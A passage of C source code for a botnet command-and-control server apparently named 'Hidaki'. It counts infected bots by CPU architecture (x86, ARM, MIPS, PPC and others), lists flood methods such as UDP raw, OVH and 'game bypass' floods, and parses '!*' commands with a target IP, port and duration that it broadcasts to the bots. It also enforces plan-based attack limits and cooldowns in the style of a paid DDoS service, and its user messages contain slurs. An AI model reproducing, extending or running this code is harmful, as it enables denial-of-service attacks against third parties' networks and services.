				sprintf(attack2,   "   \e[38;2;119;34;192m> \e[38;2;211;181;236m!* ovh <target ip> <port> <time> 1024 \e[38;2;119;34;192m## layer 7 ovh hex flood\r\n");
				sprintf(attack3,   "   \e[38;2;119;34;192m> \e[38;2;211;181;236m!* udpraw <target ip> <port> <time>   \e[38;2;119;34;192m## raw udphex flood\r\n");
        	    sprintf(attack4,   "   \e[38;2;119;34;192m> \e[38;2;211;181;236m!* game <target ip> <port> <time>     \e[38;2;119;34;192m## game bypass\r\n");
        	    sprintf(attack5,   "   \e[38;2;119;34;192m> \e[38;2;211;181;236m!* xtd <target ip> <port> <time>      \e[38;2;119;34;192m## custom std hex flood\r\n");
        	    sprintf(disabled1, "\e[38;2;119;34;192mAttacks Are Currently Disabled Please Try Later.\r\n");
	  			if(AttackStatus == 0)
	  			{
        	        if(send(datafd, attack0,  strlen(attack0),	MSG_NOSIGNAL) == -1) goto end;
					if(send(datafd, attack1,  strlen(attack1),	MSG_NOSIGNAL) == -1) goto end;
					if(send(datafd, attack2,  strlen(attack2),	MSG_NOSIGNAL) == -1) goto end;
					if(send(datafd, attack3,  strlen(attack3),	MSG_NOSIGNAL) == -1) goto end;
					if(send(datafd, attack4,  strlen(attack4),	MSG_NOSIGNAL) == -1) goto end;
					if(send(datafd, attack5,  strlen(attack5),	MSG_NOSIGNAL) == -1) goto end;
	  			} else {
	  				if(send(datafd, disabled1, strlen(disabled1), MSG_NOSIGNAL) == -1) goto end;
	  			}


					pthread_create(&title, NULL, &TitleWriter, sock);
			}
					pthread_create(&title, NULL, &TitleWriter, sock);

			if (strcasestr(buf, "bots"))
			{
        	    char synpur1[128];
        	    char synpur2[128];
        	    char synpur3[128];
        	    char synpur4[128];
        	    char synpur5[128];
        	    char synpur6[128];
        	    char synpur7[128];
        	    char synpur8[128];

	  			send(datafd, "\033[1A\033[2J\033[1;1H", strlen("\033[1A\033[2J\033[1;1H"), MSG_NOSIGNAL);
          if(send(datafd, banner0,  strlen(banner0),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner1,  strlen(banner1),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner2,  strlen(banner2),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner3,  strlen(banner3),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner4,  strlen(banner4),	MSG_NOSIGNAL) == -1) goto end;
	  			if(send(datafd, banner5,  strlen(banner5),	MSG_NOSIGNAL) == -1) goto end;
	  			sprintf(synpur8, "\e[38;2;129;8;240mTotal bots\e[38;2;229;223;232m: %d \r\n",  botsconnect());
      			if(send(datafd, synpur8, strlen(synpur8), MSG_NOSIGNAL) == -1) goto end;

        	    if(x86Connected() != 0)// should i add u in this call ye
        	    {
        	        sprintf(synpur1,"\e[38;2;129;8;240m x86\e[38;2;229;223;232m: %d \r\n",     x86Connected());
        	        if(send(datafd, synpur1, strlen(synpur1), MSG_NOSIGNAL) == -1) goto end;
        	    }
        	    if(armConnected() != 0)
        	    {
        	        sprintf(synpur2,"\e[38;2;129;8;240m Arm\e[38;2;229;223;232m: %d \r\n",     armConnected());
        	        if(send(datafd, synpur2, strlen(synpur2), MSG_NOSIGNAL) == -1) goto end;
        	    }
        	    if(mipsConnected() != 0)
        	    {
        	        sprintf(synpur3,"\e[38;2;129;8;240m Mips\e[38;2;229;223;232m: %d \r\n",     mipsConnected());
        	        if(send(datafd, synpur3, strlen(synpur3), MSG_NOSIGNAL) == -1) goto end;
        	    }
        	    if(mpslConnected() != 0)
        	    {
        	        sprintf(synpur4,"\e[38;2;129;8;240m Mpsl\e[38;2;229;223;232m: %d \r\n",     mpslConnected());
        	        if(send(datafd, synpur4, strlen(synpur4), MSG_NOSIGNAL) == -1) goto end;
        	    }
        	    if(ppcConnected() != 0)
        	    {
        	        sprintf(synpur5,"\e[38;2;129;8;240m Ppc\e[38;2;229;223;232m: %d \r\n",     ppcConnected());
        	        if(send(datafd, synpur5, strlen(synpur5), MSG_NOSIGNAL) == -1) goto end;
        	    }
        	    if(spcConnected() != 0)
        	    {
        	        sprintf(synpur6,"\e[38;2;129;8;240m Spc\e[38;2;229;223;232m: %d \r\n",     spcConnected());
        	        if(send(datafd, synpur6, strlen(synpur6), MSG_NOSIGNAL) == -1) goto end;
        	    }
        	    if(unknownConnected() != 0)
        	    {
        	        sprintf(synpur7,"\e[38;2;129;8;240m Unknown\e[38;2;229;223;232m: %d \r\n",     unknownConnected());
        	        if(send(datafd, synpur7, strlen(synpur7), MSG_NOSIGNAL) == -1) goto end;
        	    }
				pthread_create(&title, NULL, &TitleWriter, sock);

			}


 			else if(strcasestr(buf, "account"))
 			{
 				char info1[800];
 				char info2[800];
 				char info3[800];
 				char info4[800];
 				char info5[800];
 				char info6[800];

 				sprintf(info1, "Username:          %s\r\n", managements[datafd].id);
 				sprintf(info2, "Plan:              %s\r\n", managements[datafd].planname);
 				sprintf(info3, "Attack Time:       %d\r\n", managements[datafd].mymaxtime);
 				sprintf(info4, "Cooldown:          %d\r\n", managements[datafd].mycooldown);
				sprintf(info5, "Max Attacks        %d\r\n", managements[datafd].mymaxattacks);
 				sprintf(info6, "# Attacks Running: %d\r\n", Sending[datafd].amountofatks);

 				if(send(datafd, info1, strlen(info1), MSG_NOSIGNAL) == -1) goto end;
 				if(send(datafd, info2, strlen(info2), MSG_NOSIGNAL) == -1) goto end;
 				if(send(datafd, info3, strlen(info3), MSG_NOSIGNAL) == -1) goto end;
 				if(send(datafd, info4, strlen(info4), MSG_NOSIGNAL) == -1) goto end;
 				if(send(datafd, info5, strlen(info5), MSG_NOSIGNAL) == -1) goto end;
 				if(send(datafd, info6, strlen(info6), MSG_NOSIGNAL) == -1) goto end;
 			}


///////////////////////////////////////////////////////////////////////////////////////////////START OF ADMIN COMMANDS////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////START OF ADMIN COMMANDS////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////START OF ADMIN COMMANDS////////////////////////////////////////////////////////////////////////////
 			if(strcasestr(buf, "ToggleListen"))
 			{
 				if(managements[datafd].adminstatus == 1)
 				{
 					if(managements[datafd].listenattacks == 0)
 					{
 						managements[datafd].listenattacks = 1;
 						sprintf(usethis, "\e[38;5;190mAttack Listen Has Been turned ON\r\n");
 						if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
 						printf("[Hidaki]:%s Is Listening To Attacks\n", managements[datafd].id);
 					}
 					else if(managements[datafd].listenattacks == 1)
 					{
 						managements[datafd].listenattacks = 0;
 						sprintf(usethis, "\e[38;5;190mAttack Listen Has Been turned OFF\r\n");
 						if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
 						printf("[Hidaki]:%s Is No Longer Listening To Attacks\n", managements[datafd].id);
 					}
 				} else {
					char sendbuf[50];
					sprintf(sendbuf, "\e[38;5;190mYou Do Not Have Admin Perms Bitch! - TOGGLELISTEN\r\n");
					send(datafd, sendbuf, strlen(sendbuf), MSG_NOSIGNAL);
 				}
 			}

 			else if(strcasestr(buf, "ToggleAttacks"))
 			{
 				if(managements[datafd].adminstatus == 1)
 				{
 					if(AttackStatus == 0)
 					{
        	        			sprintf(usethis, "\e[38;5;190mAttacks Have Been Toggled OFF\r\n");
        	        			if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
        	        			printf("[Hidaki]:%s Has Toggled OFF Attacks\n", managements[datafd].id);
        	        			AttackStatus = 1;
 					} else {
        	        			sprintf(usethis, "\e[38;5;190mAttacks Have Been Toggled ON\r\n");
        	        			if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
        	        			printf("[Hidaki]:%s Has Toggled ON Attacks\n", managements[datafd].id);
        	        			AttackStatus = 0;
 					}
 				} else {
					char sendbuf[50];
					sprintf(sendbuf, "\e[38;5;190mYou Do Not Have Admin Perms Bitch! - TOGGLEATTACKS\r\n");
					send(datafd, sendbuf, strlen(sendbuf), MSG_NOSIGNAL);
 				}
 			}

 			else if(strcasestr(buf, "ToggleLogin"))
 			{
 				if(managements[datafd].adminstatus == 1)
 				{
 					if(managements[datafd].LoginListen == 1)
 					{
 						sprintf(usethis, "\e[38;5;190mYou Have Stopped Listening To Logins/Logouts\r\n");
 						if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
 						printf("[Hidaki]:%s Is Listening To Logins\n", managements[datafd].id);
 						managements[datafd].LoginListen = 0;
 					} else {
 						sprintf(usethis, "\e[38;5;190mYou Have Started Listening To Logins/Logouts\r\n");
 						if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
 						printf("[Hidaki]:%s Is No Longer Listening To Logins\n", managements[datafd].id);
 						managements[datafd].LoginListen = 1;
 					}
 				} else {
					char sendbuf[50];
					sprintf(sendbuf, "\e[38;5;190mYou Do Not Have Admin Perms Bitch! - TOGGELLOGIN\r\n");
					send(datafd, sendbuf, strlen(sendbuf), MSG_NOSIGNAL);
 				}
 			}


///////////////////////////////////////////////////////////////////////////////////////////////END OF ADMIN COMMANDS////////////////////////////////////////////////////////////////////////////
           //yeet
           	if(strstr(buf, "!*"))// argv [0] = !* || argv[1] = METHOD || argv[2] = IP || argv[3] = Port || argv[4] = maxtime
            {
            	if(AttackStatus == 0)
            	{
            		if(managements[datafd].cooldownstatus == 0)
            		{
            			if(Sending[datafd].amountofatks <= managements[datafd].mymaxattacks)
            			{
            				char jhere[1024];// TESTING ENCRYPTION
                			char rdbuf[1024];
                			strcpy(rdbuf, buf);
                			strcpy(jhere, buf);// TESTING ENCRYPTION
                			int argc = 0;
                			unsigned char *argv[10 + 1] = { 0 };
                			char *token = strtok(rdbuf, " ");
                			while(token != 0 && argc < 10)
                			{
                			    argv[argc++] = malloc(strlen(token) + 1);
                			    strcpy(argv[argc - 1], token);
                			    token = strtok(0, " ");
                			}

                			if(argc <= 4)
                			{
                			    char invalidargz1[800];
                			    sprintf(invalidargz1, "\e[38;5;190mYou Typed It Wrong Dumbass\r\n");
                			    if(send(datafd, invalidargz1, strlen(invalidargz1), MSG_NOSIGNAL) == -1) goto end;
                			}


                			else if(atoi(argv[4]) > managements[datafd].mymaxtime)
                			{
                			    char invalidargz1[800];
                			    sprintf(invalidargz1, "\e[38;5;190mBoot Time Exceeded Retard\r\n");
                			    if(send(datafd, invalidargz1, strlen(invalidargz1), MSG_NOSIGNAL) == -1) goto end;
                			} else {

                				char *line3 = NULL;
								size_t n3 = 0;
								FILE *f3 = fopen("logs/Blacklist.txt", "r");
								    while (getline(&line3, &n3, f3) != -1){
								        if (strstr(line3, argv[2]) != NULL){
								        	sprintf(usethis, "\e[38;5;190mThe IP %s Is Blacklisted\r\n", argv[2]);
											if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
											sprintf(usethis, "\r\n\e[38;2;134;10;240m %s@Hidaki~#  \e[0m", managements[datafd].id);
											if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
								    }
								}
								fclose(f3);
								free(line3);


								/* THIS IS A TEST */
								char testthing[800];
								enc(jhere);
								/* THIS IS A TEST AND IT WORKS*/

										  broadcast(buf, 0, "lol");
            					printf("[Hidaki]:\e[38;5;190m%s\e[1;31m: Sent A %s Attack To: %s For: %d Seconds\r\n", managements[datafd].id, argv[1], argv[2], atoi(argv[4]));
            					int sendattacklisten;
            					for(sendattacklisten=0;sendattacklisten<MAXFDS;sendattacklisten++)
            					if(managements[sendattacklisten].listenattacks == 1 && managements[sendattacklisten].connected == 1)
            					{
            						sprintf(botnet, "\r\n\e[38;5;190m%s\e[1;31m: Sent A %s Attack To: %s For: %d Seconds\r\n", managements[datafd].id, argv[1], argv[2], atoi(argv[4]));
            						if(send(sendattacklisten, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;

												sprintf(usethis, "\r\n\e[38;5;2m%s@\e[38;2;134;10;240mMortem~#\e[38;5;2m", managements[sendattacklisten].id);
            						if(send(sendattacklisten, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
            					}
            					char attacksentrip[80][2048];
            					int rip;
            					sprintf(attacksentrip[1], "\r\n\t\e[38;2;134;10;240m     _  __________=__    ========================\r\n");
            					sprintf(attacksentrip[2], "\t\e[38;2;134;10;240m      \\@([____]_____()    \e[38;2;255;255;0mATTACK SENT\e[38;2;134;10;240m on port %d \r\n", atoi(argv[3]));
            					sprintf(attacksentrip[3], "\t\e[38;2;134;10;240m     _/\|-[____]           METHOD\e[0m: %s\r\n", argv[1]);
            					sprintf(attacksentrip[4], "\t\e[38;2;134;10;240m    /     /(( )           TIME\e[0m: %d seconds\r\n", atoi(argv[4]));
            					sprintf(attacksentrip[5], "\t\e[38;2;134;10;240m   /____|'----'           TARGET\e[0m: %s\r\n", argv[2]);
            					sprintf(attacksentrip[6], "\t\e[38;2;134;10;240m   \____/                 ========================\r\n");
									send(datafd, "\033[1A\033[2J\033[1;1H", strlen("\033[1A\033[2J\033[1;1H"), MSG_NOSIGNAL);
									if(send(datafd, banner0,  strlen(banner0),	MSG_NOSIGNAL) == -1) goto end;
									if(send(datafd, banner1,  strlen(banner1),	MSG_NOSIGNAL) == -1) goto end;
									if(send(datafd, banner2,  strlen(banner2),	MSG_NOSIGNAL) == -1) goto end;
									if(send(datafd, banner3,  strlen(banner3),	MSG_NOSIGNAL) == -1) goto end;
									if(send(datafd, banner4,  strlen(banner4),	MSG_NOSIGNAL) == -1) goto end;
									if(send(datafd, banner5,  strlen(banner5),	MSG_NOSIGNAL) == -1) goto end;
  								for(rip=0;rip<30;rip++)
   								{
  									if(send(datafd, attacksentrip[rip], strlen(attacksentrip[rip]), MSG_NOSIGNAL) == -1) goto end;
  								}

  								pthread_t cooldownthread;
  									struct CoolDownArgs argz;

  								pthread_t attackcooldownthread;
  									struct CoolDownArgs yer;
  								if(managements[datafd].mycooldown > 1)
  								{
  									argz.sock = datafd;
  									argz.seconds = managements[datafd].mycooldown;
  									yer.sock = datafd;
  									yer.seconds = atoi(argv[4]);

  									pthread_create(&cooldownthread, NULL, &StartCldown, (void *)&argz);
  									pthread_create(&attackcooldownthread, NULL, &attacktime, (void*)&yer);
  									pthread_create(&title, NULL, &TitleWriter, sock);
  								}

  								if(Sending[datafd].amountofatks >= 3)
  								{
  									sprintf(usethis, "\e[38;5;190mJust Because Your Cooldown Is: %d.\r\nYou Have %d Attacks Still Running.\r\n", managements[datafd].mycooldown, Sending[datafd].amountofatks);
  									if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
  								}
  							}
  						} else {
  							sprintf(usethis, "\e[38;5;190mYou Cant Send More Than 6 Attacks.\nYou Have 6 current attacks being sent.\nCalm tf down!\n");
  							if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
  						}
                	} else {
                		sprintf(usethis, "\e[38;5;190mYour Cool Down Has Not Expired Time left: %d\r\n", managements[datafd].mycooldown - managements[datafd].cooldownsecs);
                		if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
                	}
                } else {
                	sprintf(usethis, "\e[38;5;190mAttacks Are Currently Disabled\r\n");
                	if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
                }
                memset(buf, 0, sizeof(buf));
            }

            else if(strcasestr(buf, "Logout"))
            {
            	char logout[800];
            	sprintf(logout, "Loggin Out...\r\n");
            	if(send(datafd, logout, strlen(logout), MSG_NOSIGNAL) == -1) goto end;
            	sleep(2);
				managements[datafd].connected = 0;
				memset(managements[datafd].id, 0,sizeof(managements[datafd].id));
				close(datafd);
            }

            else if(strcasestr(buf, "CLEAR") || strcasestr(buf, "cls")) {
			{
				send(datafd, "\033[1A\033[2J\033[1;1H", strlen("\033[1A\033[2J\033[1;1H"), MSG_NOSIGNAL);
				if(strlen(motd) > 2)
				{
					sprintf(banner0,  "\e[38;2;134;10;240mMOTD:\e[38;2;134;10;240m %s\r\n", motd);
				}
          if(send(datafd, banner0, strlen(banner0),	MSG_NOSIGNAL) == -1) goto end;
					if(send(datafd, banner1, strlen(banner1), MSG_NOSIGNAL) == -1) goto end;
					if(send(datafd, banner2, strlen(banner2), MSG_NOSIGNAL) == -1) goto end;
					if(send(datafd, banner3, strlen(banner3), MSG_NOSIGNAL) == -1) goto end;
					if(send(datafd, banner4, strlen(banner4), MSG_NOSIGNAL) == -1) goto end;
					if(send(datafd, banner5, strlen(banner5), MSG_NOSIGNAL) == -1) goto end;
			}
	}

	pthread_create(&title, NULL, &TitleWriter, sock);


		if(strlen(buf) > 120)
			{
				sprintf(usethis, "Stop Trying To Crash The CNC Fuck Head");
				printf("%s Has Tried To Crash The CNC\n", managements[datafd].id);
				if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
				sleep(5);
				memset(buf, 0, sizeof(buf));
				managements[datafd].connected = 0;
				memset(managements[datafd].id, 0,sizeof(managements[datafd].id));
				close(datafd);

			}
	char input[800];
    sprintf(input, "\r\n\e[38;2;134;10;240m %s@Hidaki~# \e[0m", managements[datafd].id);
	if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;

}




		end:
				for(logoutshit=0;logoutshit<MAXFDS;logoutshit++)
				{
					if(managements[logoutshit].LoginListen == 1 && managements[logoutshit].connected == 1 && loggedin == 0)
					{
						gay[datafd].just_logged_in = 0;
						sprintf(usethis, "\r\n\e[38;5;190m%s Plan: [%s] Just Logged Out!\r\n", managements[datafd].id, managements[datafd].planname);
						printf("[Hidaki]:%s Plan: [%s] Just Logged Out!\n", managements[datafd].id, managements[datafd].planname);
						if(send(logoutshit, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
						sprintf(usethis, "\e[38;2;134;10;240m %s@Hidaki~# \e[0m", managements[logoutshit].id);
						if(send(logoutshit, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
					}
				}
		loggedin = 1;
		managements[datafd].connected = 0;
		memset(managements[datafd].id, 0,sizeof(managements[datafd].id));
		close(datafd);
		OperatorsConnected--;
}



void *BotListener(int port) {
 int sockfd, newsockfd;
        socklen_t clilen;
        struct sockaddr_in serv_addr, cli_addr;
        sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if (sockfd < 0) perror("ERROR opening socket");
        bzero((char *) &serv_addr, sizeof(serv_addr));
        serv_addr.sin_family = AF_INET;
        serv_addr.sin_addr.s_addr = INADDR_ANY;
        serv_addr.sin_port = htons(port);
        if (bind(sockfd, (struct sockaddr *) &serv_addr,  sizeof(serv_addr)) < 0) perror("ERROR on binding");
        listen(sockfd,5);
        clilen = sizeof(cli_addr);
        while(1)

        {
        	    client_addr(cli_addr);
                newsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen);
                if (newsockfd < 0) perror("ERROR on accept");
                pthread_t thread;
                pthread_create( &thread, NULL, &BotWorker, (void *)newsockfd);
        }
}


int main (int argc, char *argv[], void *sock) {
        signal(SIGPIPE, SIG_IGN);
        int s;
        struct epoll_event event;
        if (argc != 4) {
			fprintf (stderr, "Usage: %s [port] [threads] [cnc-port]\n", argv[0]);
			exit (EXIT_FAILURE);
        }

        checkaccounts();
        checklog();
       	printf("\e[1;31mScreened. \r\n");
		threads = atoi(argv[2]);
		port = atoi(argv[3]);
        printf("port: %s\n",argv[3]);
        printf("threads: %s\n", argv[2]);
        listenFD = create_and_bind (argv[1]);
        if (listenFD == -1) abort ();
        s = make_socket_non_blocking (listenFD);
        if (s == -1) abort ();
        s = listen (listenFD, SOMAXCONN);
        if (s == -1) {
			perror ("listen");
			abort ();
        }
        epollFD = epoll_create1 (0);
        if (epollFD == -1) {
			perror ("epoll_create");
			abort ();
        }
        event.data.fd = listenFD;
        event.events = EPOLLIN | EPOLLET;
        s = epoll_ctl (epollFD, EPOLL_CTL_ADD, listenFD, &event);
        if (s == -1) {
			perror ("epoll_ctl");
			abort ();
        }
        pthread_t thread[threads + 2];
        while(threads--) {
			pthread_create( &thread[threads + 1], NULL, &BotEventLoop, (void *) NULL);
        }
        pthread_create(&thread[0], NULL, &BotListener, port);
        while(1) {
			broadcast("PING", -1, "ZERO");
			sleep(60);
        }
        close (listenFD);
        return EXIT_SUCCESS;
}
